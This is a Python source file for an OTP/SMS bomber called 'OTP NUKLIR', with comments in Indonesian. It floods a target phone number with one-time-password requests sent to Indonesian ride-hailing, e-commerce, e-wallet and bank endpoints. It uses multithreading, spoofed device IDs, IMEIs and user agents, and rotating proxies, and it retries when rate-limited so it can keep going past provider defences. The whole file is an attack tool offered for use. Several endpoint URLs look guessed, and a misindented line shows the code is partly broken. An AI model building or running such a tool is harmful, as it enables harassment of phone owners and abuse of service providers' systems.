#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
# ☢️ OTP NUKLIR v4.0 - BOMBER ENGINE
# Author: Novxzzz
# Engine: Sonic 1.2
# Protocol: Novxzz
# ============================================================

import requests
import threading
import time
import random
import json
import os
import sys
import uuid
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from colorama import init, Fore, Style, Back

# ============================================================
# INISIALISASI
# ============================================================

init(autoreset=True)

# ============================================================
# KONFIGURASI API ENDPOINT
# ============================================================

API_ENDPOINTS = {
    "gojek": [
        "https://api.gojek.com/v1/customers/otp",
        "https://api.gojek.com/v2/customers/otp",
        "https://auth.gojek.com/otp/request"
    ],
    "grab": [
        "https://api.grab.com/v1/auth/otp",
        "https://api.grab.com/v2/auth/otp",
        "https://auth.grab.com/otp/request"
    ],
    "shopee": [
        "https://api.shopee.com/v1/auth/otp",
        "https://api.shopee.com/v2/auth/otp",
        "https://auth.shopee.com/otp/request"
    ],
    "ovo": [
        "https://api.ovo.id/v1/otp/send",
        "https://api.ovo.id/v2/otp/send",
        "https://auth.ovo.id/otp/request"
    ],
    "dana": [
        "https://api.dana.id/v1/auth/otp",
        "https://api.dana.id/v2/auth/otp",
        "https://auth.dana.id/otp/request"
    ],
    "bca": [
        "https://api.bca.co.id/v1/otp",
        "https://api.bca.co.id/v2/otp"
    ],
    "mandiri": [
        "https://api.mandiri.co.id/v1/otp",
        "https://api.mandiri.co.id/v2/otp"
    ],
    "bni": [
        "https://api.bni.co.id/v1/otp",
        "https://api.bni.co.id/v2/otp"
    ],
    "linkaja": [
        "https://api.linkaja.com/v1/otp",
        "https://api.linkaja.com/v2/otp"
    ],
    "tokopedia": [
        "https://api.tokopedia.com/v1/otp/request",
        "https://api.tokopedia.com/v2/otp/request"
    ]
}

# Gabungkan semua endpoint
ALL_APIS = []
for endpoints in API_ENDPOINTS.values():
    ALL_APIS.extend(endpoints)

# ============================================================
# KONFIGURASI GLOBAL
# ============================================================

CONFIG = {
    "max_thread": 100,
    "timeout": 5,
    "retry_count": 3,
    "delay_between_requests": 0.02,
    "rate_limit_delay": 2.0,
    "log_enabled": True,
    "log_file": "otp_logs.json"
}

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def generate_device_id():
    """Generate device ID unik"""
    return str(uuid.uuid4())

def generate_imei():
    """Generate IMEI palsu"""
    return f"{random.randint(100000, 999999)}{random.randint(100000, 999999)}"

def get_random_user_agent():
    """Generate random User-Agent"""
    ua = UserAgent()
    return ua.random

def get_random_headers():
    """Generate random headers"""
    return {
        "User-Agent": get_random_user_agent(),
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Origin": f"https://{random.choice(['gojek.com', 'grab.com', 'shopee.com', 'ovo.id', 'dana.id'])}",
        "Referer": f"https://{random.choice(['gojek.com', 'grab.com', 'shopee.com', 'ovo.id', 'dana.id'])}/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }

def generate_payload(nomor):
    """Generate payload lengkap"""
    return {
        "phone": f"62{nomor}",
        "msisdn": f"62{nomor}",
        "countryCode": "ID",
        "platform": "android",
        "device_id": generate_device_id(),
        "device_name": random.choice(["Samsung", "Xiaomi", "Oppo", "Vivo", "Realme", "Google Pixel"]),
        "device_model": random.choice(["SM-G998B", "M2012K11AG", "CPH2025", "V2048", "RMX3081", "Pixel 6 Pro"]),
        "device_version": f"{random.randint(10, 14)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
        "app_version": f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
        "fingerprint": f"android-{random.randint(100000, 999999)}",
        "imei": generate_imei(),
        "timestamp": int(time.time()),
        "source": "mobile_app",
        "is_verified": False,
        "locale": "id_ID",
        "sim_operator": random.choice(["Telkomsel", "Indosat", "XL", "Smartfren", "Tri"]),
        "network_type": random.choice(["4G", "5G", "WiFi"]),
        "screen_resolution": random.choice(["1080x2400", "1440x3200", "1080x2340"]),
        "os_version": f"Android {random.randint(10, 14)}",
        "language": "id"
    }

def load_proxies(filename="proxy.txt"):
    """Load proxy dari file"""
    try:
        with open(filename, 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    except FileNotFoundError:
        return []

def save_log(data, filename="otp_logs.json"):
    """Simpan log ke file"""
    try:
        existing = []
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                existing = json.load(f)
        existing.append(data)
        with open(filename, 'w') as f:
            json.dump(existing, f, indent=2)
        return True
    except Exception:
        return False

def clear_screen():
    """Clear terminal"""
    os.system('clear' if os.name == 'posix' else 'cls')

# ============================================================
# SEND OTP FUNCTION
# ============================================================

def send_otp(url, nomor, proxies=None):
    """Kirim OTP ke endpoint dengan berbagai metode"""
    try:
        # Generate payload dan headers
        payload = generate_payload(nomor)
        headers = get_random_headers()
        
        # Siapkan proxy jika ada
        proxy_dict = None
        if proxies:
            proxy = random.choice(proxies)
            proxy_dict = {"http": proxy, "https": proxy}
        
        # Kirim request
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            proxies=proxy_dict,
            timeout=CONFIG["timeout"]
        )
        
        # Cek status
        if response.status_code in [200, 201, 202, 204, 205]:
            return {
                "success": True,
                "status": response.status_code,
                "url": url,
                "provider": url.split('/')[2]
            }
        elif response.status_code == 429:
            # Rate limit - delay dan retry
            time.sleep(CONFIG["rate_limit_delay"])
            return send_otp(url, nomor, proxies)
        else:
            return {
                "success": False,
                "status": response.status_code,
                "url": url,
                "provider": url.split('/')[2],
                "message": response.text[:100]
            }
            
    except requests.exceptions.Timeout:
        return {
            "success": False,
            "status": "Timeout",
            "url": url,
            "provider": url.split('/')[2]
        }
    except requests.exceptions.ConnectionError:
        return {
            "success": False,
            "status": "Connection Error",
            "url": url,
            "provider": url.split('/')[2]
        }
    except Exception as e:
        return {
            "success": False,
            "status": str(e),
            "url": url,
            "provider": url.split('/')[2]
        }

# ============================================================
# OTP BOMBER CLASS
# ============================================================

class OTPBomber:
    def __init__(self, nomor, durasi=30, thread=50, proxies=None, mode="all"):
        """
        Inisialisasi OTP Bomber
        
        Args:
            nomor (str): Nomor target (tanpa 0/62)
            durasi (int): Durasi serangan (detik)
            thread (int): Jumlah thread concurrent
            proxies (list): Daftar proxy
            mode (str): Mode serangan (all/gojek/grab/dll)
        """
        self.nomor = nomor
        self.durasi = durasi
        self.thread = min(thread, CONFIG["max_thread"])
        self.proxies = proxies or []
        self.mode = mode
        self.success = 0
        self.fail = 0
        self.total = 0
        self.retry = 0
        self.running = True
        self.results = []
        self.lock = threading.Lock()
        self.start_time = None
        
        # Pilih endpoint berdasarkan mode
        if mode == "all":
            self.endpoints = ALL_APIS
        else:
            self.endpoints = API_ENDPOINTS.get(mode, ALL_APIS)
    
    def send_request(self, url):
        """Kirim satu request OTP"""
        if not self.running:
            return
        
        result = send_otp(url, self.nomor, self.proxies)
        
        with self.lock:
            self.total += 1
            if result["success"]:
                self.success += 1
                status_text = "✓ BERHASIL"
                color = Fore.GREEN
            else:
                self.fail += 1
                status_text = "✗ GAGAL"
                color = Fore.RED
            
            # Print hasil
            provider = result.get("provider", "unknown")
            status = result.get("status", "?")
            print(f"{color}[{status_text}] {Fore.CYAN}{provider} {Fore.YELLOW}({status})")
            
            # Simpan hasil
            self.results.append(result)
    
    def attack(self):
        """Mulai serangan utama"""
        clear_screen()
        
        #banner
      print(Fore.RED + """
███╗   ██╗ ██████╗ ██╗  ██╗██╗  ██╗███████╗███████╗
████╗  ██║██╔═══██╗╚██╗██╔╝╚██╗██╔╝╚══███╔╝╚══███╔╝
██╔██╗ ██║██║   ██║ ╚███╔╝  ╚███╔╝   ███╔╝   ███╔╝ 
██║╚██╗██║██║   ██║ ██╔██╗  ██╔██╗  ███╔╝   ███╔╝  
██║ ╚████║╚██████╔╝██╔╝ ██╗██╔╝ ██╗███████╗███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
        """)
        print(Fore.CYAN + f"""
[+] TARGET: 62{self.nomor}
[+] DURASI: {self.durasi} detik
[+] THREAD: {self.thread} concurrent
[+] ENDPOINT: {len(self.endpoints)} API
[+] MODE: {self.mode.upper()}
[+] PROXY: {len(self.proxies)} loaded
        """)
        
        print(Fore.YELLOW + "\n[!] Memulai serangan...\n")
        
        # Multi-thread attack
        self.start_time = time.time()
        with ThreadPoolExecutor(max_workers=self.thread) as executor:
            while self.running and (time.time() - self.start_time) < self.durasi:
                url = random.choice(self.endpoints)
                executor.submit(self.send_request, url)
                time.sleep(CONFIG["delay_between_requests"])
        
        # Hasil akhir
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(Fore.CYAN + "\n" + "="*50)
        print(Fore.GREEN + f"[✓] BERHASIL: {self.success}")
        print(Fore.RED + f"[✗] GAGAL: {self.fail}")
        print(Fore.YELLOW + f"[📊] TOTAL: {self.total}")
        print(Fore.MAGENTA + f"[📈] RATE: {self.total/elapsed:.1f} req/s" if elapsed > 0 else "")
        print(Fore.CYAN + "="*50)
        
        # Simpan log
        self.save_results()
    
    def save_results(self):
        """Simpan hasil ke file"""
        log_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "target": f"62{self.nomor}",
            "duration": self.durasi,
            "thread": self.thread,
            "mode": self.mode,
            "success": self.success,
            "fail": self.fail,
            "total": self.total,
            "elapsed": time.time() - self.start_time if self.start_time else 0,
            "results": self.results
        }
        
        if save_log(log_data):
            print(Fore.GREEN + f"\n[✓] Log tersimpan di {CONFIG['log_file']}")
    
    def stop(self):
        """Hentikan serangan"""
        self.running = False
        print(Fore.YELLOW + "\n[!] Serangan dihentikan")
    
    def get_stats(self):
        """Dapatkan statistik"""
        return {
            "success": self.success,
            "fail": self.fail,
            "total": self.total,
            "rate": self.total / (time.time() - self.start_time) if self.start_time else 0
        }

# ============================================================
# MAIN (UNTUK TESTING)
# ============================================================

if __name__ == "__main__":
    # Testing
    print("[!] Ini adalah modul bomber.py")
    print("[!] Jalankan main.py untuk memulai serangan")
    
    # Contoh penggunaan
    nomor = input("[?] Masukkan nomor (tanpa 0/62): ")
    bomber = OTPBomber(nomor, durasi=10, thread=20)
    bomber.attack()
